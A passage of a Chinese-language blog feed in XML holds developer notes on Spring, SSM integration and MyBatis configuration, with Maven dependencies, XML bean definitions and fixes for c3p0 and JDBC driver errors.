控制器方法形参定义前</p></li><li><p>作用：绑定路径参数与处理器方法形参间的关系，要求路径参数名与形参名一一对应</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>关于Test类中使用AutoWired无法自动注入bean的的问题</title>
      <link href="/2022/04/14/%E5%85%B3%E4%BA%8ETest%E7%B1%BB%E4%B8%AD%E4%BD%BF%E7%94%A8AutoWired%E6%97%A0%E6%B3%95%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5bean%E7%9A%84%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2022/04/14/%E5%85%B3%E4%BA%8ETest%E7%B1%BB%E4%B8%AD%E4%BD%BF%E7%94%A8AutoWired%E6%97%A0%E6%B3%95%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5bean%E7%9A%84%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>在 Test 类中使用@AutoWired 注解始终无法获取到 Bean，一直报空指针异常</p><p>是需要配置 spring-test 的呀</p><ol><li><p>导入 spring 集成 junit 的坐标</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--此处需要注意的是，spring5  及以上版本要求 junit 的版本必须是 4.12 及以上--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.0.5.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>使用@Runwith 注解替换原来的运行期</p></li><li><p>使用@ContextConfiguration 指定配置文件或配置类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RunWith</span><span class="token punctuation">(</span><span class="token class-name">SpringJUnit4ClassRunner</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token comment">//加载spring核心配置文件</span><span class="token comment">//@ContextConfiguration(value = &#123;"classpath:applicationContext.xml"&#125;)</span><span class="token comment">//加载spring核心配置类</span><span class="token annotation punctuation">@ContextConfiguration</span><span class="token punctuation">(</span>classes <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">SpringConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringJunitTest</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>使用@AutoWired 注入需要测试的对象</p></li><li><p>创建测试方法进行测试</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Autowired</span><span class="token keyword">private</span> <span class="token class-name">UserService</span> userService<span class="token punctuation">;</span><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testUserService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    userService<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 问题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssm整合</title>
      <link href="/2022/04/13/ssm%E6%95%B4%E5%90%88/"/>
      <url>/2022/04/13/ssm%E6%95%B4%E5%90%88/</url>
      
        <content type="html"><![CDATA[<ol><li><p>将 SQLSessionFactory 配置到 Spring 容器中</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--加载jdbc.properties--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>property-placeholder</span> <span class="token attr-name">location</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>classpath:jdbc.properties<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token comment">&lt;!--配置数据源--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.mchange.v2.c3p0.ComboPooledDataSource<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>driverClass<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;jdbc.driver&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jdbcUrl<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;jdbc.url&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;jdbc.username&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;jdbc.password&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--配置MyBatis的SqlSessionFactory--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sqlSessionFactory<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>org.mybatis.spring.SqlSessionFactoryBean<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>configLocation<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>classpath:sqlMapConfig.xml<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>扫描 Mapper，让 Spring 容器产生 Mapper 实现类。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--配置Mapper扫描--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>org.mybatis.spring.mapper.MapperScannerConfigurer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>basePackage<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.example.mapper<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>配置声明式事务控制</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--配置声明式事务控制--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>transacionManager<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>org.springframework.jdbc.datasource.DataSourceTransactionManager<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">tx:</span>advice</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>txAdvice<span class="token punctuation">"</span></span> <span class="token attr-name">transaction-manager</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>transacionManager<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">tx:</span>attributes</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">tx:</span>method</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>*<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">tx:</span>attributes</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">tx:</span>advice</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">aop:</span>config</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">aop:</span>pointcut</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>txPointcut<span class="token punctuation">"</span></span> <span class="token attr-name">expression</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>execution(*com.example.service.impl.*.*(..))<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">aop:</span>advisor</span> <span class="token attr-name">advice-ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>txAdvice<span class="token punctuation">"</span></span> <span class="token attr-name">pointcut-ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>txPointcut<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">aop:</span>config</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>修改 Service 实现类代码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token punctuation">(</span><span class="token string">"accountService"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AccountServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">AccountService</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">AccountMapper</span> accountMapper<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token class-name">Account</span> account<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        accountMapper<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span>account<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Account</span><span class="token punctuation">></span></span> <span class="token function">selectAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> accountMapper<span class="token punctuation">.</span><span class="token function">selectAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="模板源码（ssm-整合-）"><a href="#模板源码（ssm-整合-）" class="headerlink" title="模板源码（ssm 整合 ）"></a>模板源码（ssm 整合 ）</h2><p><a href="https://github.com/wujiu0/ssm-template">https://github.com/wujiu0/ssm-template</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> 框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MYBATIS遇到的问题----没有合适的驱动(NO SUITABLE DRIVER FOUND FOR JDBC)</title>
      <link href="/2022/04/11/MYBATIS%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98-%E6%B2%A1%E6%9C%89%E5%90%88%E9%80%82%E7%9A%84%E9%A9%B1%E5%8A%A8-NO-SUITABLE-DRIVER-FOUND-FOR-JDBC/"/>
      <url>/2022/04/11/MYBATIS%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98-%E6%B2%A1%E6%9C%89%E5%90%88%E9%80%82%E7%9A%84%E9%A9%B1%E5%8A%A8-NO-SUITABLE-DRIVER-FOUND-FOR-JDBC/</url>
      
        <content type="html"><![CDATA[<p>检查一下jdbc的配置文件，以及引入它的地方</p><p><img src="/2022/04/11/MYBATIS%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98-%E6%B2%A1%E6%9C%89%E5%90%88%E9%80%82%E7%9A%84%E9%A9%B1%E5%8A%A8-NO-SUITABLE-DRIVER-FOUND-FOR-JDBC/1.png"></p><p><img src="/2022/04/11/MYBATIS%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98-%E6%B2%A1%E6%9C%89%E5%90%88%E9%80%82%E7%9A%84%E9%A9%B1%E5%8A%A8-NO-SUITABLE-DRIVER-FOUND-FOR-JDBC/2.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 异常处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Receiver class com.mchange.v2.c3p0.impl.NewProxyResultSet does not define or inherit an implementation of the resolved method &#39;abstract boolean isClosed()&#39; of interface java.sql.ResultSet.] with root cause</title>
      <link href="/2022/04/11/Receiver-class-com-mchange-v2-c3p0-impl-NewProxyResultSet-does-not-define-or-inherit-an-implementation-of-the-resolved-method-abstract-boolean-isClosed-of-interface-java-sql-ResultSet-with-root-cause/"/>
      <url>/2022/04/11/Receiver-class-com-mchange-v2-c3p0-impl-NewProxyResultSet-does-not-define-or-inherit-an-implementation-of-the-resolved-method-abstract-boolean-isClosed-of-interface-java-sql-ResultSet-with-root-cause/</url>
      
        <content type="html"><![CDATA[<p>检查一下 pom.xml 中的 c3p0 依赖是否存在或者版本是否太低</p><p>注意高版本的不再是</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>c3p0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>c3p0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>0.9.1.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而是（<strong>注意 groupId 的变化</strong>）：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.mchange<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>c3p0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>0.9.5.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 异常处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mybatis</title>
      <link href="/2022/04/05/mybatis/"/>
      <url>/2022/04/05/mybatis/</url>
      
        <content type="html"><![CDATA[<h2 id="开发步骤"><a href="#开发步骤" class="headerlink" title="开发步骤"></a>开发步骤</h2><ol><li><p>导入坐标</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--mybatis坐标--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.mybatis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>mybatis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.4.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--mysql驱动坐标--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>mysql<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>mysql-connector-java<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.1.6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>runtime<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--日志坐标--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>创建表</p></li><li><p>编写 javaBean</p></li><li><p>编写 Mapper 映射文件</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml  version="1.0" encoding="UTF-8" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">mapper</span> <span class="token name">PUBLIC</span> <span class="token string">"-//mybatis.org//DTD Mapper 3.0//EN"</span> <span class="token string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mapper</span> <span class="token attr-name">namespace</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userMapper<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>selectAll<span class="token punctuation">"</span></span>  <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.example.domain.User<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        select * from User    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mapper</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>编写 Mybatis 核心配置文件</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;!DOCTYPE configuration PUBLIC "-//mybatis.org//DTD Config 3.0//EN“ "http://mybatis.org/dtd/mybatis-3-config.dtd"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>environments</span> <span class="token attr-name">default</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>development<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>environment</span> <span class="token attr-name">id</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>development<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>transactionManager</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JDBC<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dataSource</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POOLED<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>driver<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.mysql.jdbc.Driver<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jdbc:mysql:///test<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dataSource</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>environment</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>environments</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mappers</span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!--加载sql映射文件--></span>        <span class="token tag"><span class="token tag"><span class="token 